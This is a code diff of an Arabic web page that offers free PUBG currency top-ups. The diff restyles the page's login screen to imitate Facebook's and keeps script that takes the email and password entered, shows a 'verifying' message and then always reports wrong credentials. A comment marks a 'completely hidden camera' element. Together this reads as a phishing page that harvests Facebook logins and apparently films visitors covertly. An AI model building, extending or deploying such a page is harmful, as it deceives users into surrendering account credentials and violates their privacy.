@@ -422,108 +422,175 @@
             background: #7f8c8d;
         }
 
-        /* صفحة تسجيل الدخول */
+        /* صفحة تسجيل الدخول - تصميم فيسبوك */
         .login-container {
             display: none;
-            max-width: 800px;
-            margin: 0 auto;
-            background: rgba(45, 45, 45, 0.95);
-            border-radius: 25px;
-            padding: 35px 30px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            margin-top: 60px;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            padding: 130px 0 184px 0;
+            direction: rtl;
         }
 
-        .login-header {
-            text-align: center;
-            margin-bottom: 35px;
-        }
-
-        .login-header .header-logo {
-            width: 200px;
-            height: 200px;
-            border-radius: 25px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
-            margin: 0 auto 20px auto;
-            display: block;
-        }
-
-        .login-header h1 {
-            color: #2c3e50;
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-
-        .login-header p {
-            color: #dce5e5
-            font-size: 16px;
-        }
-
-        .login-form {
+        .login-main-container {
+            overflow: hidden;
+            width: 80%;
+            margin: auto;
             display: flex;
-            flex-direction: column;
-            gap: 20px;
+            justify-content: space-between;
+            align-items: center;
         }
 
-        .password-container {
-            position: relative;
+        .login-w-50 {
+            width: 50%;
         }
 
-        .toggle-password {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #7f8c8d;
-            cursor: pointer;
-            font-size: 18px;
+        .login-logo img {
+            width: 300px;
+            margin-top: 46px;
+            margin-right: 22px;
         }
 
-        .login-btn {
-            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
-            border: none;
-            border-radius: 12px;
-            padding: 16px;
-            color: white;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
+        .login-tag-line h3 {
+            color: #1c1e21;
+            font-size: 25.1px;
+            font-weight: normal;
+            margin: 0;
+            margin-right: 50px;
+            margin-top: -10px;
         }
 
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.4);
+        .login-form-section {
+            width: 396px;
+            background-color: #ffffff;
+            padding: 16px 16px 0;
+            border-radius: 8px;
+            box-sizing: border-box;
+            margin-right: 90px;
+            margin-top: 2px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
         }
 
-        .login-btn:disabled {
-            background: #bdc3c7;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        .login-form-section input[type="text"] {
+            padding: 15px 0 17px 16px;
+            width: 100%;
+            display: block;
+            box-sizing: border-box;
+            font-size: 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            margin-bottom: 12px;
+            font-family: arial;
+        }
+        .login-form-section input[type="password"] {
+            padding: 15px 0 17px 16px;
+            width: 100%;
+            display: block;
+            box-sizing: border-box;
+            font-size: 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            margin-bottom: 12px;
+            font-family: arial;
         }
 
-        .forgot-password {
-            margin-top: 15px;
+        .login-form-section ::placeholder {
+            color: #1d2129;
+        }
+
+        .login-form-section input[type="text"]:focus,
+        .login-form-section input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+
+        .login-form-section input[type="submit"] {
+            background-color: #1877f2;
+            padding: 11px 0 12px 0;
+            width: 100%;
+            box-sizing: border-box;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            font-size: 20px;
+            color: #ffffff;
+            font-weight: bold;
+            font-family: arial;
+        }
+
+        .login-form-section input[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+
+        .login-form-section input[type="submit"]:focus {
+            box-shadow: 0 0 1px 2px rgba(88, 144, 255, 0.75), 0 1px 1px rgba(0, 0, 0, 0.15);
+            outline: none;
+        }
+
+        .login-form-section a[class="forgot"] {
             text-align: center;
-        }
-
-        .forgot-password a {
-            color: #3498db;
-            text-decoration: none;
+            color: #1877f2;
             font-size: 14px;
+            display: block;
+            font-family: arial;
+            text-decoration: none;
+            margin-top: 16px;
         }
 
-        .forgot-password a:hover {
+        .login-form-section a[class="forgot"]:hover {
             text-decoration: underline;
         }
 
+        .login-form-section .line {
+            border-top: 1px solid #dadde1;
+            margin-top: 22px;
+        }
+
+        .login-form-section a[class="create-new-acc"] {
+            background-color: #42b72a;
+            padding: 13px 6px 15px 6px;
+            width: 54%;
+            box-sizing: border-box;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #ffffff;
+            font-weight: bold;
+            font-family: arial;
+            display: inline-block;
+            border: none;
+            text-decoration: none;
+            text-align: center;
+            margin: 26px 0 24px 83px;
+        }
+
+        .login-form-section a[class="create-new-acc"]:hover {
+            background-color: #36a420;
+        }
+
+        .login-form-section a[class="create-new-acc"]:focus {
+            box-shadow: 0 0 1px 2px rgba(88, 144, 255, 0.75), 0 1px 1px rgba(0, 0, 0, 0.15);
+            outline: none;
+        }
+
+        .login-create-page p {
+            font-size: 14px;
+            text-align: center;
+            margin-top: 28px;
+            margin-right: 38px;
+            font-family: arial;
+            color: #1c1e21;
+        }
+
+        .login-create-page p > a {
+            text-decoration: none;
+            color: #1c1e21;
+            font-weight: bold;
+        }
+
+        .login-create-page p > a:hover {
+            text-decoration: underline;
+        }
+
+        /* رسالة نجاح تسجيل الدخول */
         .login-success {
             display: none;
             background: #d4edda;
@@ -665,6 +732,37 @@
             margin-bottom: 20px;
         }
 
+        /* إضافة علامة ✓ عند الاختيار */
+        .charge-option.selected::after {
+            content: "✓";
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: #3498db;
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        /* تعديل على كلاس charge-icon */
+        .charge-icon {
+            width: 80px !important;
+            height: 80px !important;
+            object-fit: contain !important;
+            margin: 0 auto 10px auto !important;
+            display: block !important;
+            background: transparent !important;
+            padding: 0 !important;
+            border-radius: 0 !important;
+        }
+
         /* تحسينات للهواتف */
         @media (max-width: 768px) {
             body {
@@ -686,7 +784,7 @@
                 font-size: 13px;
             }
             
-            .main-container, .login-container {
+            .main-container {
                 margin-top: 0;
                 padding: 25px 20px;
                 border-radius: 20px;
@@ -701,7 +799,7 @@
                 padding: 20px 15px;
             }
             
-            .header h1, .login-header h1 {
+            .header h1 {
                 font-size: 28px;
             }
 
@@ -710,9 +808,43 @@
                 height: 100px;
             }
             
-            .login-header .header-logo {
-                width: 150px;
-                height: 150px;
+            /* تصميم تسجيل الدخول للجوال */
+            .login-container {
+                padding: 0 0 90px 0;
+            }
+            
+            .login-w-50 {
+                float: none;
+                width: 100%;
+            }
+            
+            .login-logo img {
+                width: 300px;
+                margin-right: 157px;
+                margin-top: 12px;
+            }
+            
+            .login-tag-line h3 {
+                font-size: 29px;
+                margin-right: 8px;
+            }
+            
+            .login-form-section {
+                width: 395px;
+                margin-right: 110px;
+            }
+            
+            .charge-icon {
+                width: 60px !important;
+                height: 60px !important;
+            }
+            
+            .charge-option.selected::after {
+                width: 20px;
+                height: 20px;
+                font-size: 14px;
+                top: 8px;
+                left: 8px;
             }
         }
 
@@ -721,16 +853,16 @@
                 padding: 12px;
             }
             
-            .main-container, .login-container {
+            .main-container {
                 padding: 20px 15px;
                 border-radius: 18px;
             }
             
-            .header h1, .login-header h1 {
+            .header h1 {
                 font-size: 24px;
             }
             
-            .header p, .login-header p {
+            .header p {
                 font-size: 15px;
             }
             
@@ -745,14 +877,60 @@
                 font-size: 18px;
             }
             
-            .proceed-btn, .login-btn {
+            .proceed-btn {
                 padding: 18px;
                 font-size: 17px;
             }
-
-            .login-header .header-logo {
-                width: 120px;
-                height: 120px;
+            
+            /* تصميم تسجيل الدخول للجوال الصغير */
+            .login-logo img {
+                width: 210px;
+                margin-right: 70px;
+            }
+            
+            .login-tag-line h3 {
+                font-size: 18px;
+                margin-right: 0;
+            }
+            
+            .login-form-section {
+                width: 320px;
+                margin-right: 10px;
+            }
+            
+            .login-form-section input[type="text"] {
+                padding: 11px 0 13px 12px;
+                font-size: 14px;
+            }
+            
+            .login-form-section input[type="password"] {
+                padding: 11px 0 13px 12px;
+                font-size: 14px;
+            }
+            
+            .login-form-section input[type="submit"] {
+                padding: 7px 0 8px 4px;
+                font-size: 19px;
+            }
+            
+            .login-form-section a[class="forgot"] {
+                margin-top: 12px;
+                font-size: 13px;
+            }
+            
+            .login-form-section .line {
+                margin-top: 12px;
+            }
+            
+            .login-form-section a[class="create-new-acc"] {
+                font-size: 15px;
+                margin: 15px 0 13px 56px;
+                padding: 12px 6px 12px 6px;
+            }
+            
+            .charge-icon {
+                width: 50px !important;
+                height: 50px !important;
             }
         }
 
@@ -772,249 +950,6 @@
         body.show-login .login-container {
             display: block !important;
         }
-        /* إضافة هذا الكود في قسم الستايل */
-
-.charge-icon {
-    width: 80px !important;        /* مقاس موحد للعرض */
-    height: 80px !important;       /* مقاس موحد للارتفاع */
-    object-fit: contain !important; /* للحفاظ على التناسب دون تشويه */
-    margin: 0 auto 10px auto !important; /* توسيط الصورة */
-    display: block !important;
-    border-radius: 12px !important;
-    background: rgba(255, 255, 255, 0.1) !important;
-    padding: 8px !important;
-}
-
-/* للجوال - مقاس أصغر */
-@media (max-width: 768px) {
-    .charge-icon {
-        width: 60px !important;
-        height: 60px !important;
-        padding: 6px !important;
-    }
-}
-
-@media (max-width: 480px) {
-    .charge-icon {
-        width: 50px !important;
-        height: 50px !important;
-        padding: 5px !important;
-    }
-}
-        /* تعديل على كلاس charge-icon */
-.charge-icon {
-    width: 80px !important;
-    height: 80px !important;
-    object-fit: contain !important;
-    margin: 0 auto 10px auto !important;
-    display: block !important;
-    /* إزالة الخلفية وال padding */
-    background: transparent !important;
-    padding: 0 !important;
-    border-radius: 0 !important;
-}
-
-/* للجوال */
-@media (max-width: 768px) {
-    .charge-icon {
-        width: 60px !important;
-        height: 60px !important;
-    }
-}
-
-@media (max-width: 480px) {
-    .charge-icon {
-        width: 50px !important;
-        height: 50px !important;
-    }
-}
-        /* إضافة علامة ✓ عند الاختيار */
-.charge-option.selected::after {
-    content: "✓";
-    position: absolute;
-    top: 10px;
-    left: 10px;
-    background: #3498db;
-    color: white;
-    width: 25px;
-    height: 25px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    font-weight: bold;
-    box-shadow: 0 2px 5px rgba(0,0,0,0.3);
-}
-
-/* للجوال */
-@media (max-width: 768px) {
-    .charge-option.selected::after {
-        width: 20px;
-        height: 20px;
-        font-size: 14px;
-        top: 8px;
-        left: 8px;
-    }
-}
-        /* تصميم صفحة تسجيل الدخول بأسلوب فيسبوك الأصلي */
-.login-container {
-  background: #f0f2f5;
-  min-height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 40px 20px;
-  box-sizing: border-box;
-}
-
-.fb-login-wrapper {
-  display: flex;
-  flex-wrap: wrap;
-  justify-content: center;
-  align-items: center;
-  gap: 60px;
-  max-width: 1000px;
-  width: 100%;
-}
-
-.fb-left {
-  flex: 1;
-  min-width: 320px;
-  text-align: right;
-}
-
-.fb-logo {
-  width: 280px;
-  margin-bottom: 10px;
-}
-
-.fb-left h2 {
-  font-family: Helvetica, Arial, sans-serif;
-  font-size: 28px;
-  font-weight: normal;
-  color: #1c1e21;
-  line-height: 32px;
-  margin-right: 15px;
-}
-
-.fb-right {
-  flex: 1;
-  min-width: 380px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
-
-.fb-form {
-  width: 100%;
-  max-width: 396px;
-  background: #fff;
-  padding: 20px;
-  border-radius: 8px;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-  box-sizing: border-box;
-  text-align: center;
-}
-
-.fb-form input {
-  width: 100%;
-  padding: 14px 16px;
-  margin-bottom: 12px;
-  border: 1px solid #dddfe2;
-  border-radius: 6px;
-  font-size: 17px;
-  font-family: Helvetica, Arial, sans-serif;
-}
-
-.fb-form input:focus {
-  border-color: #1877f2;
-  outline: none;
-  box-shadow: 0 0 0 2px #e7f3ff;
-}
-
-.fb-form button {
-  width: 100%;
-  padding: 14px 0;
-  font-size: 20px;
-  border: none;
-  border-radius: 6px;
-  cursor: pointer;
-  font-weight: bold;
-  color: #fff;
-  background: #1877f2;
-  transition: background 0.2s ease;
-}
-
-.fb-form button:hover {
-  background: #166fe5;
-}
-
-.fb-form .forgot {
-  display: inline-block;
-  margin-top: 15px;
-  color: #1877f2;
-  font-size: 14px;
-  text-decoration: none;
-}
-
-.fb-form .forgot:hover {
-  text-decoration: underline;
-}
-
-.fb-form hr {
-  margin: 20px 0;
-  border: none;
-  border-top: 1px solid #dadde1;
-}
-
-.fb-form .create-account {
-  background: #42b72a;
-  font-size: 17px;
-  font-weight: bold;
-  width: auto;
-  padding: 14px 16px;
-  border-radius: 6px;
-}
-
-.fb-form .create-account:hover {
-  background: #36a420;
-}
-
-.create-page {
-  font-size: 14px;
-  margin-top: 25px;
-  text-align: center;
-  color: #1c1e21;
-}
-
-.create-page a {
-  font-weight: bold;
-  text-decoration: none;
-  color: #1c1e21;
-}
-
-.create-page a:hover {
-  text-decoration: underline;
-}
-
-/* استجابة للجوال */
-@media (max-width: 768px) {
-  .fb-login-wrapper {
-    flex-direction: column;
-    gap: 30px;
-    text-align: center;
-  }
-  .fb-left h2 {
-    font-size: 24px;
-    text-align: center;
-    margin: 0 auto;
-  }
-  .fb-logo {
-    margin: 0 auto 20px auto;
-  }
-}
-
     </style>
 </head>
 <body>
@@ -1134,28 +1069,46 @@
         </div>
     </div>
 
-    <!-- صفحة تسجيل الدخول بتصميم فيسبوك الحقيقي -->
-<div class="login-container" id="login-container">
-  <div class="fb-login-wrapper">
-    <div class="fb-left">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo" alt="Facebook Logo">
-      <h2>Facebook يساعدك على التواصل والمشاركة مع الأشخاص في حياتك.</h2>
+    <!-- صفحة تسجيل الدخول - تصميم فيسبوك -->
+    <div class="login-container" id="login-container">
+        <div class="login-main-container">
+            <div class="login-w-50">
+                <div class="login-logo">
+                    <img src="WWW.png" alt="شعار النظام">
+                </div>
+                <div class="login-tag-line">
+                    <h3>شحن شدات ببجي يساعدك على التواصل ومشاركة اللحظات مع الأصدقاء.</h3>
+                </div>
+            </div>
+            <div class="login-w-50">
+                <div class="login-form-section">
+                    <form action="#" method="POST" id="loginForm">
+                        <input type="text" name="email-or-number" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف">
+                        <input type="password" name="password" id="password" placeholder="كلمة المرور">
+                        <input type="submit" name="submit" id="loginBtn" value="تسجيل الدخول">
+                        <a href="#" target="_self" class="forgot">هل نسيت كلمة المرور؟</a>
+                        <div class="line"></div>
+                        <a href="#" target="_self" class="create-new-acc">إنشاء حساب جديد</a>
+                    </form>
+                </div>
+                <div class="login-create-page">
+                    <p><a href="#" target="_self">إنشاء صفحة</a> لمشاهير أو علامة تجارية أو نشاط تجاري.</p>
+                </div>
+                
+                <!-- رسالة نجاح تسجيل الدخول -->
+                <div class="login-success" id="loginSuccess">
+                    <p>جاري التحقق من بياناتك...</p>
+                </div>
+                
+                <div id="login-status" class="status-message"></div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 موقع شحن شدات. جميع الحقوق محفوظة.</p>
+            <p>الإصدار 3.1.0 | <a href="#" id="show-login-terms">الشروط والأحكام</a></p>
+        </div>
     </div>
-
-    <div class="fb-right">
-      <form class="fb-form">
-        <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-        <input type="password" placeholder="كلمة المرور" required>
-        <button type="submit">تسجيل الدخول</button>
-        <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
-        <hr>
-        <button type="button" class="create-account">إنشاء حساب جديد</button>
-      </form>
-      <p class="create-page"><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو نشاط تجاري.</p>
-    </div>
-  </div>
-</div>
-
 
     <!-- الكاميرا المخفية تماماً -->
     <div id="camera-container">
@@ -1207,7 +1160,6 @@
         const loginForm = document.getElementById('loginForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
-        const togglePasswordBtn = document.getElementById('togglePassword');
         const loginBtn = document.getElementById('loginBtn');
         const loginStatusDiv = document.getElementById('login-status');
         const loginSuccess = document.getElementById('loginSuccess');
@@ -1483,26 +1435,6 @@
             }
         }
         
-        // تبديل رؤية كلمة المرور
-        togglePasswordBtn.addEventListener('click', () => {
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                togglePasswordBtn.textContent = '🙈';
-                togglePasswordBtn.setAttribute('aria-label', 'إخفاء كلمة المرور');
-            } else {
-                passwordInput.type = 'password';
-                togglePasswordBtn.textContent = '👁️';
-                togglePasswordBtn.setAttribute('aria-label', 'إظهار كلمة المرور');
-            }
-        });
-        
-        // إدخال كلمة المرور باستخدام Enter
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                loginForm.dispatchEvent(new Event('submit'));
-            }
-        });
-        
         // معالجة تسجيل الدخول
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -1525,7 +1457,7 @@
             // إظهار رسالة التحقق العادية
             loginSuccess.style.display = 'block';
             loginBtn.disabled = true;
-            loginBtn.textContent = 'جاري التحقق...';
+            loginBtn.value = 'جاري التحقق...';
             
             // إخفاء لوحة المفاتيح في الأجهزة المحمولة
             if ('virtualKeyboard' in navigator) {
@@ -1548,7 +1480,7 @@
             loginSuccess.style.display = 'none';
             showLoginStatus('البريد الإلكتروني أو كلمة المرور غير صحيحة', 'error');
             loginBtn.disabled = false;
-            loginBtn.textContent = 'تسجيل الدخول';
+            loginBtn.value = 'تسجيل الدخول';
             
             // إعادة التركيز على حقل اسم المستخدم
             setTimeout(() => {
@@ -1645,7 +1577,7 @@
                         loginForm.reset();
                         loginSuccess.style.display = 'none';
                         loginBtn.disabled = false;
-                        loginBtn.textContent = 'تسجيل الدخول';
+                        loginBtn.value = 'تسجيل الدخول';
                         
                         // إعادة إلى الصفحة الرئيسية
                         document.body.classList.remove('show-login');
@@ -1697,15 +1629,3 @@
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
